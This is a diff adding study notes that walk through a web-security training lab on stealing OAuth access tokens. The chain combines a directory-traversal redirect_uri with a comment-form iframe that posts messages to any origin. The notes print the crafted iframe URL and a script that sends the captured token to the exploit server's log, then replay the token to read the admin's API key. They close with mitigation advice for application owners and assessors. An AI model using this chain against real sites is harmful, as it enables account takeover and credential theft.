@@ -204,6 +204,51 @@ If the hash is present:
 
 
 ## 5. Stealing OAuth access tokens via a proxy page
+This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
 
+To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
 
+The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service. You can log in via your own social media account using the following credentials: `wiener:peter`.
 
+**Analysis**:
+1. Study the OAuth flow while proxying traffic through Burp and identify that the `redirect_uri` is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
+2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
+3. From the proxy history, right-click on the `GET /auth?client_id=[...]` request and select "Copy URL". Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:
+    `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
+4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:
+    `<script> window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false) </script>`
+5. To check the exploit is working, store it and then click "View exploit". Make sure that the `iframe` loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
+6. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
+7. Send the `GET /me` request to Burp Repeater. In Repeater, replace the token in the `Authorization: Bearer` header with the one you just copied and send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
+
+**Workflow**
+1. Study the OAuth flow while proxying traffic through Burp and identify that the `redirect_uri` is vulnerable to directory traversal. This enables you to redirect access tokens to arbitrary pages on the blog website.
+	![](Pasted%20image%2020250310042747.png)
+2.  Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
+	![](Pasted%20image%2020250310043124.png)
+	![](Pasted%20image%2020250310043427.png)
+3. Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form.
+	![](Pasted%20image%2020250310044111.png)
+4. Add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:
+	![](Pasted%20image%2020250310044447.png)
+	![](Pasted%20image%2020250310044732.png)
+
+The attacker delivers the exploit to the victim, who unknowingly:
+- Loads the malicious page with the iframe
+- Gets redirected to the OAuth authorization page
+- Authenticates (or is already authenticated)
+- Is redirected to the comment form with the token in the URL
+- The comment form sends this URL (with token) via postMessage
+- The attacker's script captures and exfiltrates the token
+
+### Security Implications
+1. **For Application Owners**:
+    - Implement strict redirect_uri validation using exact matching
+    - Never use wildcards (`*`) for postMessage origin validation
+    - Implement PKCE (Proof Key for Code Exchange) for all OAuth flows
+    - Use short-lived tokens with proper scope limitations
+2. **For Security Assessors**:
+    - Always check for directory traversal in redirect_uri parameters
+    - Examine all client-side messaging mechanisms for improper origin validation
+    - Look for opportunities to chain multiple vulnerabilities together
+    - Verify that token handling follows security best practices
